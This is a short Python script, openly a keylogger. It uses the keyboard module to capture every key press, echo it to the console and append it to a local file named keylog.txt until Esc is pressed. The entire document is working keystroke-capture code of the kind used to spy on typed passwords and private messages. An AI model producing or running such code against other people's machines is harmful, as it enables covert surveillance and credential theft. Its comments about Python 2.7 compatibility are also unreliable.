import keyboard  # Import the keyboard module to capture keystrokes
import time

# File where the keystrokes will be logged
log_file = "keylog.txt"

# Function to log keystrokes
def log_keystrokes():
    print("Keylogger started. Press 'Esc' to stop logging.")
    
    with open(log_file, "w") as f:  # Open the file in write mode to start logging
        while True:
            # Capture the event when a key is pressed
            event = keyboard.read_event()
            
            if event.event_type == keyboard.KEY_DOWN:  # We only want key presses, not key releases
                key = event.name
                # Use string formatting compatible with Python 2.7
                print("Key pressed: %s" % key)  # Old-style string formatting for Python 2.7
                f.write(key + "\n")  # Log the key to the file
                f.flush()  # Ensure the key is immediately written to the file
                
                if key == 'esc':  # Stop the keylogger if 'Esc' is pressed
                    print("Keylogger stopped.")
                    break

# Run the keylogger function
log_keystrokes()
